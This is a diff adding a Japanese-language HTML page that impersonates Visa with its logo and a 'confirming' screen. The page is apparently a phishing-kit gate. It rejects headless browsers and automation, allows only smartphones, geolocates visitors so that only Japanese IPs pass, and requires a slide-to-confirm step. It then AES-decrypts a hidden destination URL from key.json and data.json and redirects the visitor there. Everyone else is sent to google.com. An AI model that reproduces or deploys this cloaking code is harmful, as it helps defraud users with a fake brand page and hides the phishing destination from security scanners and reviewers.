@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>確認中...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: "Noto Sans JP", sans-serif;
+      background: #fefefe;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+    .logo img {
+      width: 150px;
+      margin-bottom: 30px;
+    }
+    .confirm-box {
+      text-align: center;
+    }
+    #countdown {
+      font-size: 20px;
+      margin-top: 10px;
+    }
+    .slide-container {
+      width: 300px;
+      height: 50px;
+      background: #eee;
+      border-radius: 25px;
+      position: relative;
+      margin-top: 20px;
+      overflow: hidden;
+      user-select: none;
+      touch-action: none;
+    }
+    .slider {
+      width: 50px;
+      height: 50px;
+      background: #e60033;
+      color: white;
+      text-align: center;
+      line-height: 50px;
+      border-radius: 50%;
+      position: absolute;
+      left: 0;
+      top: 0;
+      cursor: pointer;
+      transition: background 0.3s;
+      z-index: 2;
+    }
+    .slider.complete {
+      background: #28a745;
+    }
+    #slideText {
+      position: absolute;
+      left: 0;
+      right: 0;
+      top: 0;
+      bottom: 0;
+      text-align: center;
+      line-height: 50px;
+      color: #999;
+      font-size: 16px;
+      z-index: 1;
+    }
+    .hidden { display: none; }
+  </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script>
+    function startRedirect() {
+      if (navigator.webdriver || /Headless/i.test(navigator.userAgent)) { alert('自動化アクセスは拒否されました。'); return; };
+    if (!/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) { alert('このページはスマートフォンでのみ閲覧可能です。'); return; };
+      Promise.all([
+        fetch('key.json').then(res => res.json()),
+        fetch('data.json').then(res => res.json())
+      ]).then(([k, d]) => {
+        const key = CryptoJS.enc.Utf8.parse(k.k);
+        const iv = key;
+        try {
+          const decrypted = CryptoJS.AES.decrypt(d.d, key, {
+            iv: iv,
+            mode: CryptoJS.mode.CBC,
+            padding: CryptoJS.pad.Pkcs7
+          }).toString(CryptoJS.enc.Utf8);
+          if (decrypted.startsWith("http")) {
+            window.location.href = decrypted;
+          }
+        } catch(e) {
+          console.error("解読失敗", e);
+        }
+      });
+    }
+  </script>
+</head>
+<body>
+  <div class="logo">
+    <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="LOGO">
+  </div>
+  <div class="confirm-box">
+    <h2 id="mainText">接続しています...</h2>
+    <p id="countdown" class="hidden">確認画面を表示しております...</p>
+    <div class="slide-container hidden" id="sliderBox">
+      <div class="slider" id="sliderBtn">&#x27A4;</div>
+      <div id="slideText">スライドして確認</div>
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script>
+    // 反机器人检测
+    if (navigator.webdriver || /Headless/i.test(navigator.userAgent)) {
+      alert("自動化アクセスは禁止されています。");
+      window.location.href = "https://www.google.com";
+    }
+        // 参数定义
+    const allowCountryList = ["JP"];
+    const fallbackUrl = "https://www.google.com";
+    const testurl = "https://jp.yahoo.com/?p=us";
+    const delayBeforeConfirm = 3;
+    const delayAfterSlide = 2000;
+    function startRedirect() {
+      location.href = testurl;
+      return;
+      fetch("key.json").then(res => res.json()).then(kj => {
+        const key = kj.k;
+        return fetch("data.json").then(res => res.json()).then(j => {
+          const encrypted = j.d;
+          const iv = CryptoJS.enc.Utf8.parse(key);
+          const decrypted = CryptoJS.AES.decrypt(encrypted, iv, {
+            iv: iv,
+            mode: CryptoJS.mode.CBC,
+            padding: CryptoJS.pad.Pkcs7
+          }).toString(CryptoJS.enc.Utf8);
+          if (decrypted.startsWith("http")) location.href = decrypted;
+        });
+      });
+    }
+    // 国家判断
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const country = data.country;
+        if (!allowCountryList.includes(country)) {
+          window.location.href = fallbackUrl;
+          return;
+        }
+        // 无秒倒计时，仅提示文字
+        const cd = document.getElementById("countdown");
+        cd.classList.remove("hidden");
+        setTimeout(() => {
+          cd.classList.add("hidden");
+          document.getElementById("sliderBox").classList.remove("hidden");
+        }, delayBeforeConfirm * 1000);
+        // 滑动逻辑
+        const slider = document.getElementById("sliderBtn");
+        const container = document.querySelector(".slide-container");
+        let startX, currentX = 0;
+        let dragging = false;
+        function updateSlider(x) {
+          currentX = x - startX;
+          if (currentX
+    < 0) currentX = 0;
+    const max = container.offsetWidth - slider.offsetWidth;
+    if (currentX >
+      max) currentX = max;
+            slider.style.left = currentX + "px";
+            return currentX >= max;
+          }
+          function endSlide(success) {
+            dragging = false;
+            if (success) {
+              slider.classList.add("complete");
+              document.getElementById("slideText").innerText = "✅ 確認完了。ページを移動しています...";
+              setTimeout(startRedirect, delayAfterSlide);
+            } else {
+              slider.style.left = "0px";
+            }
+          }
+          slider.addEventListener("mousedown", e => { dragging = true; startX = e.clientX; });
+          window.addEventListener("mousemove", e => { if (!dragging) return; const s = updateSlider(e.clientX); if (s) endSlide(true); });
+          window.addEventListener("mouseup", () => { if (!dragging) return; endSlide(currentX >= container.offsetWidth - slider.offsetWidth); });
+          slider.addEventListener("touchstart", e => { dragging = true; startX = e.touches[0].clientX; });
+          slider.addEventListener("touchmove", e => { if (!dragging) return; const s = updateSlider(e.touches[0].clientX); if (s) endSlide(true); });
+          slider.addEventListener("touchend", () => { if (!dragging) return; endSlide(currentX >= container.offsetWidth - slider.offsetWidth); });
+        });
+  </script>
+</body>
+</html>
